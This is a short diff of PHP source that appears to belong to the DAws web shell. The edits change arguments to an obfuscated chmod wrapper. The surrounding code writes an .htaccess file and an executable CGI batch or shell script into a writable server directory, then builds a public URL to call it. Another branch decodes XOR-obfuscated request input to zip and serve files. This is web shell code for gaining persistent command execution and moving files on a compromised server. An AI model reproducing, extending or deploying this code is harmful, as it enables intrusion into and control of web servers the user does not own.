@@ -955,7 +955,7 @@ if ($_SESSION["cgi"] == False)
 		file_put_contents($writeread_dir."cgi\\.htaccess",unsh3ll_this($htaccess));
 
 		file_put_contents($writeread_dir."cgi\\DAws.bat",unsh3ll_this($cgibat));
-		chm0dit($writeread_dir."cgi\\DAws.bat", 0755, "");
+		chm0dit($writeread_dir."cgi\\DAws.bat", 0755, "755");
 
 		$_SESSION["onlinecgi"] = str_replace("$real_path", "", $writeread_dir."cgi/DAws.bat");
 		$_SESSION["onlinecgi"] = str_replace("\\", "/", $_SESSION["onlinecgi"]);
@@ -973,7 +973,7 @@ if ($_SESSION["cgi"] == False)
 		file_put_contents($writeread_dir."cgi/.htaccess",unsh3ll_this($htaccess));
 
 		file_put_contents($writeread_dir."cgi/DAws.sh",unsh3ll_this($cgish));
-		chm0dit($writeread_dir."cgi/DAws.sh", 0755, "");
+		chm0dit($writeread_dir."cgi/DAws.sh", 0755, "755");
 
 		$_SESSION["onlinecgi"] = str_replace("$real_path", "", $writeread_dir."cgi/DAws.sh");
 		$_SESSION["onlinecgi"] = "http://".$_SERVER['SERVER_NAME']."/".$_SESSION["onlinecgi"];
@@ -2194,7 +2194,7 @@ else if(isset($_GET["zip"]))
 				
 				zipWindows($file, unxor_this($_GET['zip']));
 
-				chm0dit($file, 0644, "");
+				chm0dit($file, 0644, "644");
 				header('Content-Description: File Transfer');
 				header('Content-Type: application/octet-stream');
 				header('Content-Disposition: attachment; filename='.basename($file));
